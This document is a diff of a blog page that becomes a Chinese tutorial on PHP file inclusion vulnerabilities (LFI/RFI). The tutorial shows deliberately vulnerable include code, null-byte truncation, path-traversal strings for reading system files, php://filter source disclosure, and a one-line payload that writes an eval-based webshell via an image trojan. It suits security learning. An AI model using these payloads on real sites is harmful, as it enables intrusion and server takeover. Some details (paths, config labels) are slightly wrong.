@@ -6,8 +6,7 @@
     <meta name="referrer" content="origin">
     <meta http-equiv="Cache-Control" content="no-transform">
     <meta http-equiv="Cache-Control" content="no-siteapp">
-    
-    <title>分类</title>
+    <title>文件包含基础知识</title>
 
     <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/LongCang.css">
     <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/Monda.css">
@@ -18,12 +17,13 @@
     <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/Rosario.css">
     <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/UbuntuMono.css">
 
-    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/css/page.css">
+    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/css/post.css">
     
         <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/css/normal.css">
     
 
     <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/js/jquery-3.4.1.min.js"></script>
+
 <meta name="generator" content="Hexo 5.4.0"></head>
 <body>
     <a id="cover"></a>
@@ -31,10 +31,21 @@
     <div class="header">
         <div class="vertical">
             <div class="inner">
-                <h1 class="header-subtitle">分类</h1>
+                <h1 class="header-subtitle">文件包含基础知识</h1>
                 <div class="header-subinfo">
-                    <p class="article-info-text Chinese"></p>
-                    <p class="article-info-text English"></p>                  
+                    <p class="article-info-text">
+                        <span>
+                            <i class="iconfont icon-time"></i> 发表时间：2021-04-24
+                        </span>
+                        
+                            <span id="/2021/04/24/文件包含基础知识/" class="leancloud_visitors" data-flag-title="文件包含基础知识">
+                                <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
+                            </span>
+                        
+                        <span>
+                            <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2021/04/24/文件包含基础知识/"></span>
+                        </span>  
+                    </p>                 
                 </div>
             </div>
         </div>
@@ -43,14 +54,134 @@
 </div>
     <div id="container">
     <div id="content">
-        <div class="categories">
-    <div class="categories-title">
-        目前共计 11 个分类
+        <div id="article">
+    <div class="toc"></div>
+    <div class="article-body">
+        <p>开发人员通常会把可重复使用的函数写到单个文件中，在使用某个函数的时候，直接调用此文件，无需再次编写，这调用文件的过程通常被称为包含。</p>
+<h1 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h1><ol>
+<li>web应用实现了动态包含</li>
+<li>动态包含的文件路径参数，客户端可控<h1 id="PHP中的文件包含"><a href="#PHP中的文件包含" class="headerlink" title="PHP中的文件包含"></a>PHP中的文件包含</h1><h2 id="语句"><a href="#语句" class="headerlink" title="语句"></a>语句</h2>PHP中提供了4个文件包含的函数，四个函数之间略有区别。如下<table>
+<thead>
+<tr>
+<th align="left">函数</th>
+<th align="left">区别</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Include()</td>
+<td align="left">文件包含失败时，会产生警告，脚本会继续运行。</td>
+</tr>
+<tr>
+<td align="left">Include_once()</td>
+<td align="left">与include()功能相同，文件只会被包含一次</td>
+</tr>
+<tr>
+<td align="left">Require()</td>
+<td align="left">文件包含失败时，会产生错误，直接结束脚本执行</td>
+</tr>
+<tr>
+<td align="left">Require_once()</td>
+<td align="left">与require()功能相同，文件只会被包含一次</td>
+</tr>
+</tbody></table>
+</li>
+</ol>
+<h2 id="相关配置"><a href="#相关配置" class="headerlink" title="相关配置"></a>相关配置</h2><p>文件包含是PHP的基本功能之一，有本地文件包含和远程文件包含之分。本地文件包含就是可以读取和打开本地文件，远程文件包含就是可以远程加载文件。我们可以通过php.ini来进行配置。如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Allow_url_fopen&#x3D;On&#x2F;Off</span><br><span class="line">本地文件包含（LFI）</span><br><span class="line">Allow_url_include&#x3D;On&#x2F;Off</span><br><span class="line">远程文件包含（RFI）</span><br></pre></td></tr></table></figure>
+<p>文件包含实例<br>我们通过以下简单的代码来测试文件包含漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#39;path&#39;]))&#123;</span><br><span class="line">	include $_GET[&#39;path&#39;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	echo &quot;?path&#x3D;info.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="本地文件包含（LFI）"><a href="#本地文件包含（LFI）" class="headerlink" title="本地文件包含（LFI）"></a>本地文件包含（LFI）</h3><p>本地文件包含就是我们可以通过相对路径找到文件，然而包含之。访问的URL为<br>[<a target="_blank" rel="noopener" href="http://127.0.0.1/php_test/fileinclude.php/?path=info.php%5D">http://127.0.0.1/php_test/fileinclude.php/?path=info.php]</a></p>
+<h3 id="远程文件包含（RFI）"><a href="#远程文件包含（RFI）" class="headerlink" title="远程文件包含（RFI）"></a>远程文件包含（RFI）</h3><p>远程文件包含就是我们可以通过http(s)或者ftp等方式，远程加载文件。访问的连接<br>http://</p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>使用文件包含时，有类似于以上测试代码的设计，实现了动态包含，就有产生文件包含漏洞的风险。如果实现动态包含的参数，web应用没有进行严格净化，客户端用户可以影响或控制文件包含的路径，就会产生文件包含漏洞。</p>
+<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ol>
+<li>无视文件扩展名读取文件<br>包含文件时，PHP会读取文件的源码，包括图片文件。尝试包含图片，连接为。。。<br>我们发现打开图片不是图像，而是图片的源码。</li>
+<li>无条件解析PHP代码<br>文件包含在读取文件源码的同时，如果遇到符合PHP语法规范的代码，就会无条件执行。</li>
+</ol>
+<h1 id="空字符绕过"><a href="#空字符绕过" class="headerlink" title="空字符绕过"></a>空字符绕过</h1><p>空字符安全限制绕过，是PHP小于5.3.4版本的一个漏洞，CVE编号是CVE-2006-7243。这个漏洞就是PHP接受来自于路径名中的空(null)字符，这可能允许依赖于上下文的攻击者通过在此字符后放置安全文件扩展名来绕过预期的访问限制，也就是前面的00截断。00截断攻击也会提现在文件包含中。<br>Web应用设计时，经常会包含模块文件，简单的程序如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[‘path’]))&#123;</span><br><span class="line">include $_GET[‘path’].”.html”;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo “?path&#x3D;[path]”;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这个简单的代码限定了被包含文件的后缀名是html<br><a target="_blank" rel="noopener" href="http://123.12.12.12/fileinclude/00/?path=info">http://123.12.12.12/fileinclude/00/?path=info</a><br>此处我们可以通过00截断来包含任意文件，比如同级目录下的inc.php文件。<br><a target="_blank" rel="noopener" href="http://123.12.12.12/fileinclude/00/?path=info.php%00">http://123.12.12.12/fileinclude/00/?path=info.php%00</a></p>
+<p>注意：需要关闭PHP的魔术引号，在php.ini中<br><img src="/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB1.png"><br>自动转义，添加右斜线，改成off</p>
+<h1 id="文件包含漏洞利用"><a href="#文件包含漏洞利用" class="headerlink" title="文件包含漏洞利用"></a>文件包含漏洞利用</h1><ol>
+<li><p>读取敏感文件<br>我们可以利用文件包含漏洞读取任意文件，读取文件的时候有利用条件<br>a.目标主机文件存在（目标文件的路径，绝对/相对路径）<br>b.具有文件可读权限<br>读取本地host的文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?path&#x3D;c:\windows\system32\dirvers\etc\hosts</span><br><span class="line">?path&#x3D;..\..\...\..\..\..\..\..\..\windows\system32\dirvers\etc\hosts</span><br></pre></td></tr></table></figure></li>
+<li><p>直接包含图片木马<br>可以利用文件包含漏洞直接包含图片木马。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?Path&#x3D;.&#x2F;.&#x2F;.png</span><br></pre></td></tr></table></figure>
+<p>是用菜刀连接</p>
+</li>
+<li><p>包含木马写shell脚本<br>我们也可以将如下代码写入到图片中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  fputs(fopen(‘shell.php’,’w’),”&lt;?php  @eval(\$_REQUEST[‘cmd’])?&gt;”);?&gt;</span><br></pre></td></tr></table></figure>
+<p>这段代码的含义是，在当前目录下创建一个名为shell.php的文件，内容为[<?Php phpinfo();?>]，当我们直接包含图片的时候，该段代码就会被执行。</p>
+</li>
+<li><p>PHP封装协议–访问本地文件<br>我们可以使用php的file协议访问本地系统文件，提交参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[?Path&#x3D;file:&#x2F;&#x2F;c:\windows\system32\dirvers\etc\hosts]</span><br></pre></td></tr></table></figure></li>
+<li><p>PHP封装协议–传输PHP文件<br>可以使用以下参数来传送任意PHP文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?Path&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;inc.php</span><br></pre></td></tr></table></figure>
+<p>然后把得到的所有字符串base64解码即可。</p>
+</li>
+<li><p>PHP封装协议–执行PHP文件<br>我们还可以利用PHP的封装协议来执行PHP命令<br><strong>已知一个网站存在本地文件包含漏洞，没有文件上传API，如何利用？</strong></p>
+</li>
+<li><p>包含本地日志文件getshell<br>日志文件路径？<br>1、常识<br>2、爆破<br>2、包含session文件，造成sessionid泄露</p>
+</li>
+</ol>
+
+        <p class="suffix-end">__END__</p>
+        <div class="suffix-box">
+            <div class="suffix-box-left">
+                <img src="/image/touxiang.jpg" alt="moss">
+            </div>
+            <div class="suffix-box-right">
+                <span class="suffix-box-title">文章作者</span>：moss
+                <br>
+                <span class="suffix-box-title">文章出处</span>：<a href="/2021/04/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" target="_blank">文件包含基础知识</a>
+                <br>
+                <span class="suffix-box-title">作者签名</span>：等花开，等风来
+                <br>
+                <span class="suffix-box-title">关于主题</span>：<a href="https://github.com/first19326/Hexo-LiveForCode" target="_blank">Hexo - Live For Code</a>
+                <br>
+                <span class="suffix-box-title">版权声明</span>：文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
+                <br>
+            </div>
+            <div style="clear: both;"></div>
+        </div>
     </div>
-    <div class="categories-content">
-        <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/category/WP-ctfshow/">-WP -ctfshow</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/category/markdown%E8%AF%AD%E6%B3%95/">-markdown语法</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/category/web%E5%AE%89%E5%85%A8-CSRF/">-web安全 -CSRF</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/category/web%E5%AE%89%E5%85%A8-PHP%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/">-web安全 -PHP代码注入</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/category/web%E5%AE%89%E5%85%A8-SSRF/">-web安全 -SSRF</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/category/web%E5%AE%89%E5%85%A8-XSS/">-web安全 -XSS</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/category/web%E5%AE%89%E5%85%A8-sql%E6%B3%A8%E5%85%A5/">-web安全 -sql注入</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/category/web%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">-web安全 -反序列化漏洞</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/category/web%E5%AE%89%E5%85%A8-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/">-web安全 -命令注入</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/category/web%E5%AE%89%E5%85%A8-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">-web安全 -文件上传漏洞</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/category/web%E5%AE%89%E5%85%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">-web安全 -文件包含</a><span class="category-list-count">1</span></li></ul>
+    <div class="article-footer">
+        
+            <div class="category">
+                分类：
+                
+                    <a href="/category/web%E5%AE%89%E5%85%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">-web安全 -文件包含</a>
+                
+            </div>
+        
+        
+            <div class="tag">
+                标签：
+                
+                    <a href="/tag/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">-基础知识</a>
+                
+            </div>
+        
+        <div class="article-prev-next">
+            
+                <a href="/2021/04/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="prev-prefix">« </a> 上一篇：    <a href="/2021/04/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" title="发布于 2021-04-24 11:03">反序列化漏洞基础知识</a>
+                <br>
+            
+            
+                <a href="/2021/04/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="next-prefix">» </a> 下一篇：    <a href="/2021/04/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" title="发布于 2021-04-24 10:52">文件上传漏洞基础知识</a>
+            
+        </div>
     </div>
+    
+    <div class="article-comments">
+        <div class="comments-title">
+            评论列表
+        </div>
+        <div class="comments-content">
+        </div>
+    </div>
+
 </div>
+
     </div>
 </div>
     <div id="footer"></div>
